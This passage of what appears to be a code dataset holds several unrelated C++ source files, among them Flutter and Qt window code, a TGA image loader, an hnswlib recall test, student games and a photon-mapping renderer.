origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "/****************************************************************************\nCopyright (c) 2010-2012 cocos2d-x.org\nCopyright (c) 2013-2016 Chukong Technologies Inc.\nCopyright (c) 2017-2018 Xiamen Yaji Software Co., Ltd.\n\nhttp://www.cocos2d-x.org\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n****************************************************************************/\n\n#include <string.h>\n#include <stdlib.h>\n\n#include \"base/TGAlib.h\"\n#include \"base/CCData.h\"\n#include \"platform/CCFileUtils.h\"\n\nNS_CC_BEGIN\n\nstatic bool tgaLoadRLEImageData(unsigned char* Buffer, unsigned long bufSize, tImageTGA *info);\nvoid tgaFlipImage( tImageTGA *info );\n\n// load the image header field from stream\nbool tgaLoadHeader(unsigned char* buffer, unsigned long bufSize, tImageTGA *info)\n{\n    bool ret = false;\n\n    do \n    {\n        size_t step = sizeof(unsigned char) * 2;\n        CC_BREAK_IF((step + sizeof(unsigned char)) > bufSize);\n        memcpy(&info->type, buffer + step, sizeof(unsigned char));\n\n        step += sizeof(unsigned char) * 2;\n        step += sizeof(signed short) * 4;\n        CC_BREAK_IF((step + sizeof(signed short) * 2 + sizeof(unsigned char)) > bufSize);\n        memcpy(&info->width, buffer + step, sizeof(signed short));\n        memcpy(&info->height, buffer + step + sizeof(signed short), sizeof(signed short));\n        memcpy(&info->pixelDepth, buffer + step + sizeof(signed short) * 2, sizeof(unsigned char));\n\n        step += sizeof(unsigned char);\n        step += sizeof(signed short) * 2;\n        CC_BREAK_IF((step + sizeof(unsigned char)) > bufSize);\n        unsigned char cGarbage;\n        memcpy(&cGarbage, buffer + step, sizeof(unsigned char));\n\n        info->flipped = 0;\n        if ( cGarbage & 0x20 ) \n        {\n            info->flipped = 1;\n        }\n        ret = true;\n    } while (0);\n\n    return ret;\n}\n\nbool tgaLoadImageData(unsigned char *Buffer, unsigned long bufSize, tImageTGA *info)\n{\n    bool ret = false;\n\n    do \n    {\n        int mode,total,i;\n        unsigned char aux;\n        size_t step = (sizeof(unsigned char) + sizeof(signed short)) * 6;\n\n        // mode equal the number of components for each pixel\n        mode = info->pixelDepth / 8;\n        // total is the number of unsigned chars we'll have to read\n        total = info->height * info->width * mode;\n\n        size_t dataSize = sizeof(unsigned char) * total;\n        CC_BREAK_IF((step + dataSize) > bufSize);\n        memcpy(info->imageData, Buffer + step, dataSize);\n\n        // mode=3 or 4 implies that the image is RGB(A). However TGA\n        // stores it as BGR(A) so we'll have to swap R and B.\n        if (mode >= 3)\n        {\n            for (i=0; i < total; i+= mode)\n            {\n                aux = info->imageData[i];\n                info->imageData[i] = info->imageData[i+2];\n                info->imageData[i+2] = aux;\n            }\n        }\n\n        ret = true;\n    } while (0);\n\n    return ret;\n}\n\nstatic bool tgaLoadRLEImageData(unsigned char* buffer, unsigned long bufSize, tImageTGA *info)\n{\n    unsigned int mode,total,i, index = 0;\n    unsigned char aux[4], runlength = 0;\n    unsigned int skip = 0, flag = 0;\n    size_t step = (sizeof(unsigned char) + sizeof(signed short)) * 6;\n\n    // mode equal the number of components for each pixel\n    mode = info->pixelDepth / 8;\n    // total is the number of unsigned chars we'll have to read\n    total = info->height * info->width;\n\n    for( i = 0; i < total; i++ )\n    {\n        // if we have a run length pending, run it\n        if ( runlength != 0 )\n        {\n            // we do, update the run length count\n            runlength--;\n            skip = (flag != 0);\n        }\n        else\n        {\n            // otherwise, read in the run length token\n            CC_BREAK_IF((step + sizeof(unsigned char)) > bufSize);\n            memcpy(&runlength, buffer + step, sizeof(unsigned char));\n            step += sizeof(unsigned char);\n\n            // see if it's a RLE encoded sequence\n            flag = runlength & 0x80;\n            if ( flag )\n   ",
    "#include <assert.h>\n#include \"../../hnswlib/hnswlib.h\"\n\ntypedef unsigned int docidtype;\ntypedef float dist_t;\n\nint main() {\n    int dim = 16;               // Dimension of the elements\n    int max_elements = 1000;    // Maximum number of elements, should be known beforehand\n    int M = 16;                 // Tightly connected with internal dimensionality of the data\n                                // strongly affects the memory consumption\n    int ef_construction = 200;  // Controls index search speed/build speed tradeoff\n\n    int num_queries = 100;\n    int num_docs = 10;          // Number of documents to search\n    int ef_collection = 15;     // Number of candidate documents during the search\n                                // Controlls the recall: higher ef leads to better accuracy, but slower search\n    docidtype min_doc_id = 0;\n    docidtype max_doc_id = 49;\n\n    // Initing index\n    hnswlib::MultiVectorL2Space<docidtype> space(dim);\n    hnswlib::BruteforceSearch<dist_t>* alg_brute = new hnswlib::BruteforceSearch<dist_t>(&space, max_elements);\n    hnswlib::HierarchicalNSW<dist_t>* alg_hnsw = new hnswlib::HierarchicalNSW<dist_t>(&space, max_elements, M, ef_construction);\n\n    // Generate random data\n    std::mt19937 rng;\n    rng.seed(47);\n    std::uniform_real_distribution<> distrib_real;\n    std::uniform_int_distribution<docidtype> distrib_docid(min_doc_id, max_doc_id);\n\n    size_t data_point_size = space.get_data_size();\n    char* data = new char[data_point_size * max_elements];\n    for (int i = 0; i < max_elements; i++) {\n        // set vector value\n        char* point_data = data + i * data_point_size;\n        for (int j = 0; j < dim; j++) {\n            char* vec_data = point_data + j * sizeof(float);\n            float value = distrib_real(rng);\n            *(float*)vec_data = value;\n        }\n        // set document id\n        docidtype doc_id = distrib_docid(rng);\n        space.set_doc_id(point_data, doc_id);\n    }\n\n    // Add data to index\n    std::unordered_map<hnswlib::labeltype, docidtype> label_docid_lookup;\n    for (int i = 0; i < max_elements; i++) {\n        hnswlib::labeltype label = i;\n        char* point_data = data + i * data_point_size;\n        alg_hnsw->addPoint(point_data, label);\n        alg_brute->addPoint(point_data, label);\n        label_docid_lookup[label] = space.get_doc_id(point_data);\n    }\n\n    // Query random vectors and check overall recall\n    float correct = 0;\n    float total_num_elements = 0;\n    size_t query_size = dim * sizeof(float);\n    for (int i = 0; i < num_queries; i++) {\n        char* query_data = new char[query_size];\n        for (int j = 0; j < dim; j++) {\n            size_t offset = j * sizeof(float);\n            char* vec_data = query_data + offset;\n            float value = distrib_real(rng);\n            *(float*)vec_data = value;\n        }\n        hnswlib::MultiVectorSearchStopCondition<docidtype, dist_t> stop_condition(space, num_docs, ef_collection);\n        std::vector<std::pair<dist_t, hnswlib::labeltype>> hnsw_results =\n            alg_hnsw->searchStopConditionClosest(query_data, stop_condition);\n\n        // check number of found documents\n        std::unordered_set<docidtype> hnsw_docs;\n        std::unordered_set<hnswlib::labeltype> hnsw_labels;\n        for (auto pair: hnsw_results) {\n            hnswlib::labeltype label = pair.second;\n            hnsw_labels.emplace(label);\n            docidtype doc_id = label_docid_lookup[label];\n            hnsw_docs.emplace(doc_id);\n        }\n        assert(hnsw_docs.size() == num_docs);\n\n        // Check overall recall\n        std::vector<std::pair<dist_t, hnswlib::labeltype>> gt_results = \n            alg_brute->searchKnnCloserFirst(query_data, max_elements);\n        std::unordered_set<docidtype> gt_docs;\n        for (int i = 0; i < gt_results.size(); i++) {\n            if (gt_docs.size() == num_docs) {\n                break;\n            }\n            hnswlib::labeltype gt_label = gt_results[i].second;\n            if (hnsw_labels.find(gt_label) != hnsw_labels.end()) {\n                correct += 1;\n            }\n            docidtype gt_doc_id = label_docid_lookup[gt_label];\n            gt_docs.emplace(gt_doc_id);\n            total_num_elements += 1;\n        }\n        delete[] query_data;\n    }\n    float recall = correct / total_num_elements;\n    std::cout << \"random elements search recall : \" << recall << \"\\n\";\n    assert(recall > 0.95);\n\n    // Query the elements for themselves and measure recall\n    correct = 0;\n    for (int i = 0; i < max_elements; i++) {\n        hnswlib::MultiVectorSearchStopCondition<docidtype, dist_t> stop_condition(space, num_docs, ef_collection);\n        std::vector<std::pair<float, hnswlib::labeltype>> result =\n            alg_hnsw->searchStopConditionClosest(data + i * data_point_size, stop_condition);\n        hnswlib::labeltype label = -1;\n        if (!result.empty()) {\n            label = result[0].second;\n        }\n        if (label == i) correct++;\n    }\n    recall = correct / m",
    "\n// class Solution {\n// public:\n// void insert_tail(ListNode *&head,ListNode *&tail,int val)\n// {\n//     ListNode *newNode=new ListNode(val);\n//     if(head==NULL)\n//     {\n//         head=newNode;\n//         tail=newNode;\n//         return;\n//     }\n//     tail->next=newNode;\n//     tail=tail->next;\n// }\n// void reverse(ListNode *&head,ListNode *cur)\n// {\n//     if(cur->next==NULL)\n//     {\n//         head=cur;\n//         return;\n//     }\n//     reverse(head,cur->next);\n//     cur->next->next=cur;\n//     cur->next=NULL;\n// }\n//     bool isPalindrome(ListNode* head) {\n//        ListNode *newHead=NULL;\n//        ListNode *newTail=NULL;\n//        ListNode *temp=head;\n//        while(temp!=NULL)\n//        {\n//         insert_tail(newHead,newTail,temp->val);\n//         temp=temp->next;\n//        } \n//        reverse(newHead,newHead);\n//        temp=head;\n//        ListNode *temp2=newHead;\n//        while(temp!=NULL)\n//        {\n//         if(temp->val !=temp2->val)\n//         {\n//             return false;\n//         }\n//         temp=temp->next;\n//         temp2=temp2->next;\n//        }\n//        return true;\n//     }\n// };",
    "#include <iostream> //Ela inclui as var tipo string, mas \u00e9 uma boa pr\u00e1tica colocar\n#include <string>\n#include <map>\n#include <vector>\n#include <fstream> //Para colocar o ifstream \n#include <ctime>\n#include <cstdlib>\nusing namespace std;\n\n//Est\u00e1 fora do escopo pois \u00e9 uma vari\u00e1vel global\nstring secretWord = \"DOUGLAS\"; \nmap<char, bool> shoted; //nao entendi\nvector<char> missedAttempt;\n\n//Fun\u00e7\u00e3o para verificar se a letra existe ou n\u00e3o na palavra\nbool existWord(char shot){\n   for(char word : secretWord)\n        if(shot == word){\n            return true;\n        }   \n   return false;\n}\n\nbool notHit(){\n    for(char word : secretWord){\n        if(!shoted[word]){\n            return true;\n        }\n    }\n    return false;\n}\n\nbool notHanger(){\n    return missedAttempt.size() < 5;\n}\n\nvoid printHeader(){\n     cout << endl;\n    cout << \"*******************************\" <<endl;\n    cout << \"********JOGO DA FORCA**********\" <<endl;\n    cout << \"*******************************\" <<endl;\n    cout << endl;\n}\n\nvoid printMistakes(){\n    cout <<\"Chutes errados: \" ;\n    for(char word : missedAttempt){\n        cout << word << \" \" ;\n    }\n    cout << endl;\n}\n\n//n\u00e3o entendi essa fun\u00e7\u00e3o\nvoid printWord(){\n    for(char word : secretWord){\n        if(shoted[word]){\n          cout << word << \" \";\n        }else{\n            cout << \"_ \";\n        }\n    }\n        cout << endl;\n}\n\nvoid shot(){\n    cout << \"Seu chute: \";\n    char shot;\n    cin >> shot;\n    shoted [shot] = true; //n\u00e3o entendi\n\n    if(existWord(shot)){\n        cout << \"Voce acertou, seu chute esta na palavra\" << endl;\n    }else{\n         cout << \"Voce errou, seu chute nao esta na palavra\" <<endl;\n         missedAttempt.push_back(shot);  \n    }     \n    cout << endl;\n}\n\nvector<string> readFile(){\n    //input, file, stream\n    ifstream file;\n    file.open(\"words.txt\");\n\n    //if para se caso o arquivo for mudado de lugar, exibir uma mensagem de erro\n    if(file.is_open()){ \n        int numberWords;\n        file >> numberWords;\n\n        //cout << \"O arquivo possui \" << numberWords << \" words.\" <<endl;\n\n        vector<string> fileWords;\n\n        for(int i = 0; i < numberWords; i++){\n            string readWord;\n            file >> readWord;\n            //cout <<\" Na linha \" << i << \" :\" << readWord <<endl;\n            fileWords.push_back(readWord);\n        }\n        file.close(); //boa pratica \u00e9 fechar o arquivo ap\u00f3s o uso dele\n        return fileWords;\n    } else {\n        cout << \"N\u00e3o foi poss\u00edvel acessar o banco de palavras.\" << endl;\n        exit(0);\n    }\n}\n\n//draw = sortear\nvoid drawWord(){\n    vector<string> words = readFile();\n\n    srand(time(NULL));\n    int drawIndex = rand() % words.size();\n\n    secretWord = words[drawIndex];\n}\n\n\nvoid saveFile(vector<string> newList){\n    ofstream file;\n    file.open(\"words.txt\");\n\n    if(file.is_open()){\n        file << newList.size() << endl;\n\n        for(string word : newList){\n            file << word << endl;\n            //cout << \"Palavra adicionada com sucesso.\" << endl;\n        }\n        file.close();\n    }else{\n        cout << \"N\u00e3o foi poss\u00edvel acessar o banco de palavras.\" << endl;\n        exit(0);\n    }\n}\n\nvoid addWord(){\n    cout << \"Digite a nova palavra, usando letras maiusculas.\" << endl;\n    string newWord;\n    cin >> newWord;\n\n    vector<string> listWords = readFile();\n    listWords.push_back(newWord);\n\n    saveFile(listWords);\n}\n\n\nint main(){\n    printHeader();\n\n    readFile();\n    drawWord();\n\n    while(notHit() && notHanger()){\n        printMistakes();\n        printWord();\n        shot();\n    }\n    cout << \"Fim de jogo\" << endl;\n    cout << \"A palavra secreta era: \" << secretWord << endl;\n    if(notHit()){\n        cout << \"Voce perdeu! Tente novamente!\" << endl;\n    } else {\n        cout << \"Parabens! Voce acertou a palavra secreta \"<< endl;\n        cout << \"Voce deseja adicionar uma nova palavra ao banco(S/N)\" << endl;\n        char answer;\n        cin >> answer;\n        if(answer == 'S'){\n            addWord();\n        } else {\n\n        }\n    }  \n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n#include <QFileDialog>\r\n#include <QFile>\r\n#include <QString>\r\n#include <QMessageBox>\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n}\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\n\r\nvoid MainWindow::on_actionNew_triggered()\r\n{\r\n    ui->textEdit->clear();\r\n}\r\n\r\nvoid MainWindow::on_actionOpen_triggered()\r\n{\r\n   QString fileName = QFileDialog::getOpenFileName(this,\"\u6253\u5f00\u6587\u4ef6\",\"D:\\\\qt\\\\test\",\"*.txt\");\r\n   if(fileName.isEmpty()){\r\n       QMessageBox::warning(this,\"\u8b66\u544a\",\"\u8bf7\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\");\r\n   }\r\n   else{\r\n       QFile * qFile = new QFile(fileName,this);\r\n       qFile->open(QIODevice::ReadOnly);\r\n       QByteArray qb =  qFile->readAll();\r\n       ui->textEdit->setText(QString(qb));\r\n       qFile->close();\r\n\r\n   }\r\n}\r\n\r\nvoid MainWindow::on_actionSave_triggered()\r\n{\r\n    QString fileName = QFileDialog::getSaveFileName(this,\"\u4fdd\u5b58\u6587\u4ef6\",\"D:\\\\qt\\\\test\");\r\n    if(fileName.isEmpty()){\r\n        QMessageBox::warning(this,\"\u8b66\u544a\",\"\u8bf7\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\");\r\n    }\r\n    else{\r\n        QFile * qFile = new QFile(fileName,this);\r\n        qFile->open(QIODevice::WriteOnly);\r\n       QByteArray qba ;\r\n       qba.append(ui->textEdit->toPlainText());\r\n       qFile->close();\r\n    }\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nclass CharChecker {\npublic:\n    int getCharPoint(string input1, string input2) {\n        initByCollectIndexing(input1, input2);\n\n        if (getDiffCount() == 0) return MAX_SAMECHAR_POINT;\n        if (getSameCount() == 0) return MIN_SAMECHAR_POINT;\n\n        return getPartialCharPoint();\n    }\n\n    void initByCollectIndexing(std::string& input1, std::string& input2) {\n        setDAT(input1, dat1);\n        setDAT(input2, dat2);\n    }\n\n    int getDiffCount() {\n        int result = 0;\n        for (int i = 0; i < 200; i++) {\n            if (dat1[i] + dat2[i] == 1) result++;\n        }\n        return result;\n    }\n\n    int getSameCount() {\n        int result = 0;\n        for (int i = 0; i < 200; i++) {\n            if (dat1[i] == 1 && dat2[i] == 1) result++;\n        }\n        return result;\n    }\n\n    int getTotalCount() {\n        int result = 0;\n        for (int i = 0; i < 200; i++) {\n            if (dat1[i] == 1 || dat2[i] == 1) result++;\n        }\n        return result;\n    }\n\n    int getPartialCharPoint()\n    {\n        return MAX_SAMECHAR_POINT * getSameCount() / getTotalCount();\n    }\n\nprivate:\n    void setDAT(std::string& str, int dat[]) {\n        for (int i = 0; i < str.length(); i++) {\n            dat[str[i]] = 1;\n        }\n    }\n\n    const int MAX_SAMECHAR_POINT = 40;\n    const int MIN_SAMECHAR_POINT = 0;\n\n    int dat1[200] = { 0 };\n    int dat2[200] = { 0 };\n};\n\nclass SimilarityChecker\n{\npublic:\n    int CheckStrLength(string input1, string input2)\n    {\n        int size1 = input1.size();\n        int size2 = input2.size();\n        int small = GetSmallLength(size1, size2);\n        int large = GetLargeLength(size1, size2);\n        int gap = GetLengthGap(large, small);\n        \n        if (IsSameLength(size1, size2))\n        {\n            return MAX_LENGTH_POINT;\n        }\n\n        if (IsDouble(large, small))\n        {\n            return ZERO_LENGTH_POINT;\n        }\n\n        return GetSubPoint(gap, small);\n    }\n\nprivate:\n    const int MAX_LENGTH_POINT = 60;\n    const int ZERO_LENGTH_POINT = 0;\n\n    int GetSmallLength(int size1, int size2)\n    {\n        return (size1 > size2) ? size2 : size1;;\n    }\n\n    int GetLargeLength(int size1, int size2)\n    {\n        return (size1 > size2) ? size1 : size2;;\n    }\n\n    bool IsSameLength(int size1, int size2)\n    {\n        return (size1 == size2);\n    }\n\n    int GetLengthGap(int large, int small)\n    {\n        return large - small;\n    }\n\n    bool IsDouble(int large, int small)\n    {\n        return (small * 2 <= large);\n    }\n\n    int GetSubPoint(int gap, int small)\n    {\n        double subPoint = (1 - ((double)gap / (double)small)) * MAX_LENGTH_POINT;\n        return (int)subPoint;\n    }\n};",
    "#include \"headers/MainMenu.h\"\n\nMainMenu::MainMenu(float width, float height)\n{\n\tif (!font.loadFromFile(\"resources/fonts/MainFont.otf\")) {\n\t\tstd::cout << \"No font is here\";\n\t}\n\n\t// Play\n\tmainMenu[0].setFont(font);\n\tmainMenu[0].setFillColor(sf::Color::White);\n\tmainMenu[0].setString(\"New Game\");\n\tmainMenu[0].setCharacterSize(70);\n\tmainMenu[0].setPosition(850, 400);\n\n\t// Options\n\tmainMenu[1].setFont(font);\n\tmainMenu[1].setFillColor(sf::Color::White);\n\tmainMenu[1].setString(\"How to Play\");\n\tmainMenu[1].setCharacterSize(70);\n\tmainMenu[1].setPosition(850, 500);\n\n\t// About\n\tmainMenu[2].setFont(font);\n\tmainMenu[2].setFillColor(sf::Color::White);\n\tmainMenu[2].setString(\"About\");\n\tmainMenu[2].setCharacterSize(70);\n\tmainMenu[2].setPosition(850, 600);\n\n\t// Exit\n\tmainMenu[3].setFont(font);\n\tmainMenu[3].setFillColor(sf::Color::White);\n\tmainMenu[3].setString(\"Exit\");\n\tmainMenu[3].setCharacterSize(70);\n\tmainMenu[3].setPosition(850, 700);\n\n\tMainMenuSelected = 0; // \u00c2\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00e8\u00ec\u00ee \u00e2\u00e8\u00e1\u00f0\u00e0\u00ed\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e0 \u00ef\u00e5\u00f0\u00f8\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\n\tmainMenu[MainMenuSelected].setFillColor(sf::Color::Yellow); // \u00cf\u00e5\u00f0\u00f8\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e2\u00e8\u00e4\u00b3\u00eb\u00e5\u00ed\u00e8\u00e9\n}\n\nvoid MainMenu::draw(sf::RenderWindow& window)\n{\n\tfor (int i = 0; i < Max_main_menu; ++i)\n\t{\n\t\twindow.draw(mainMenu[i]);\n\t}\n}\n\nvoid MainMenu::MoveUp()\n{\n\tmainMenu[MainMenuSelected].setFillColor(sf::Color::White);\n\n\tif (MainMenuSelected - 1 >= 0)\n\t{\n\t\tMainMenuSelected--;\n\t}\n\telse\n\t{\n\t\tMainMenuSelected = Max_main_menu - 1;\n\t}\n\n\tmainMenu[MainMenuSelected].setFillColor(sf::Color::Yellow);\n}\n\nvoid MainMenu::MoveDown()\n{\n\tmainMenu[MainMenuSelected].setFillColor(sf::Color::White);\n\n\tif (MainMenuSelected + 1 < Max_main_menu)\n\t{\n\t\tMainMenuSelected++;\n\t}\n\telse\n\t{\n\t\tMainMenuSelected = 0;\n\t}\n\n\tmainMenu[MainMenuSelected].setFillColor(sf::Color::Yellow);\n}\n\nMainMenu::~MainMenu()\n{\n}",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  stimulus.cpp -- \n\n  Original Author: Rocco Jonack, Synopsys, Inc., 1999-07-29\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n\n#include \"stimulus.h\"\n\nvoid stimulus::entry() {\n\n  int i, j;\n\n  // sending some reset values\n  reset.write(true);\n  in_valid.write(false);\n  in_value.write(0);\n  wait();\n  reset.write(false);\n  wait(5);\n  for(i=0; i<3; i++){\n    in_valid.write(true);\n    for(j=1; j<=10; j++) {\n      in_value.write(j);\n      cout << \"Stimuli1 : in_valid = true in_value \" << j << \" at \"\n\t   << sc_time_stamp() << endl;\n      wait();\n    };\n    in_valid.write(false);\n    wait(4);\n    for(j=1; j<=10; j++) {\n      in_value.write(j);\n      cout << \"Stimuli2 : in_valid = true in_value \" << j << \" at \"\n\t   << sc_time_stamp() << endl;\n      wait();\n    };\n    wait(4);\n    for(j=1; j<=10; j++) {\n      in_value.write(j);\n      cout << \"Stimuli3 : in_valid = true in_value \" << j << \" at \"\n\t   << sc_time_stamp() << endl;\n      wait();\n    };\n    wait(10);\n  };\n\n  wait(15);\n  sc_stop();\n}\n\n// EOF\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"paywall_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Based on code by Henrik Wann Jensen\n */\n\n#include \"../include/photonMap.h\"\n\n#define swap(ph, a, b) { Photon *phTemp = ph[a]; ph[a] = ph[b]; ph[b] = phTemp; }\n\nusing namespace std;\n\nVec3::Vec3() {\n\tx = y = z = 0;\n}\n\nVec3::Vec3(float a, float b, float c) {\n\tx = a;\n\ty = b;\n\tz = c;\n}\n\nfloat Vec3::magnitude() {\n\treturn sqrt(x * x + y * y + z * z);\n}\n\nvoid Vec3::normalize() {\n\tfloat mag = this->magnitude();\n\tx /= mag;\n\ty /= mag;\n\tz /= mag;\n}\n\nfloat Vec3::getVec3Component(int axis) {\n\tif(axis == 0)\n\t\treturn x;\n\tif(axis == 1)\n\t\treturn y;\n\treturn z;\n}\n\nvoid Vec3::setVec3Component(int axis, float val) {\n\tif(axis == 0)\n\t\tx = val;\n\telse if(axis == 1)\n\t\ty = val;\n\telse z = val;\n}\n\nvoid Vec3::matMul(float m[][3]) { \n\tfloat v[3]; \n\tv[0] = x;\n\tv[1] = y;\n\tv[2] = z;\n\tfloat ans[3];\n\tfor(int i = 0 ; i < 3 ; i++)\n\t\tans[i]=0;\n\t\n\tfor(int i = 0 ; i < 3 ; i++) {\n\t\tfor(int j = 0 ; j < 3 ; j++)\n\t\t\tans[i] += m[i][j] * v[j];\n\t}\n\tx = ans[0];\n\ty = ans[1];\n\tz = ans[2];\n}\n\n\nPhoton::Photon(Vec3 pos, Vec3 dir, Vec3 pow) {\n\t\tposition = pos;\n\t\tint t = int(acos(dir.z) * 256.0 / M_PI);\n\t\tif(t > 255) \n\t\t\ttheta = t;\n\t\telse\n\t\t\ttheta = (unsigned char)t;\n\t\tint p = int(atan2(dir.y, dir.x) * (256.0 / 2.0 * M_PI));\n\t\tif(p > 255)\n\t\t\tphi = 255;\n\t\telse if(p < 0)\n\t\t\tphi = (unsigned char)(phi + 256);\n\t\telse phi = (unsigned char)phi;\n\t\tpower = pow;\n}\n\nvoid PhotonMap::print() {\n\tfor (int i = 0; i < maxPhotons; i++) {\n\t\tPhoton * node = &photons[i];\n\t\tcout<<photons[i].position.x<<\" \"<<photons[i].position.y<<\" \"<<photons[i].position.z<<endl;\n\t}\n}\n\nvoid PhotonMap::display() {\n\tglBegin(GL_POINTS);\n\tfor (int i = 0; i < storedPhotons; i++) {\n\t\tglColor3f(photons[i].power.x, photons[i].power.y, photons[i].power.z);\n\t\tglVertex3f(photons[i].position.x, photons[i].position.y, photons[i].position.z);\n\t}\n\tglEnd();\n}\n\nPhotonMap::PhotonMap(int maxP) {\n\tstoredPhotons = 0;\n\tmaxPhotons = maxP;\n\tphotons = (Photon*)malloc(sizeof(Photon) * (maxPhotons + 1));\n\tif(photons == NULL) {\n\t\tcout<<\"Out of memory initalizing photon map\"<<endl;\n\t\texit(-1);\n\t}\n\tbboxMin.x = bboxMin.y = bboxMin.z = 1e5f;\n\tbboxMax.x = bboxMax.y = bboxMax.z = -1e5f;\n\n\tfor (int i = 0; i < 256; i++) {\n\t\tfloat angle = float(i) * (1.0 / 256.0) * M_PI;\n\t\tcosTheta[i] = cos(angle);\n\t\tsinTheta[i] = sin(angle);\n\t\tcosPhi[i] = cos(2.0 * angle);\n\t\tsinPhi[i] = sin(2.0 * angle);\n\t}\n}\n\nvoid PhotonMap::store(Photon* p) {\n\tif(storedPhotons > maxPhotons)\n\t\treturn;\n\tstoredPhotons++;\n\tphotons[storedPhotons] = *p;\n\tPhoton *node = &photons[storedPhotons];\n\tnode = p;\n\tif(node->position.x < bboxMin.x)\n\t\tbboxMin.x = node->position.x;\n\tif(node->position.y < bboxMin.y)\n\t\tbboxMin.y = node->position.y;\n\tif(node->position.z < bboxMin.z)\n\t\tbboxMin.z = node->position.z;\n\n\tif(node->position.x > bboxMax.x)\n\t\tbboxMax.x = node->position.x;\n\tif(node->position.y > bboxMax.y)\n\t\tbboxMax.y = node->position.y;\n\tif(node->position.z > bboxMax.z)\n\t\tbboxMax.z = node->position.z;\n}\n\n/* \n * Function to split the photon array into two separate pieces\n * around the median with all photons below the median in the \n * lower half and all photons above the median in the upper\n * half\n * Axis is the comparison parameter\n */\nvoid PhotonMap::medianSplit(Photon **p, const int start, const int end, const int median, const int axis) {\n\tint left = start, right = end;\n\twhile(right > left) {\n\t\tconst float v = 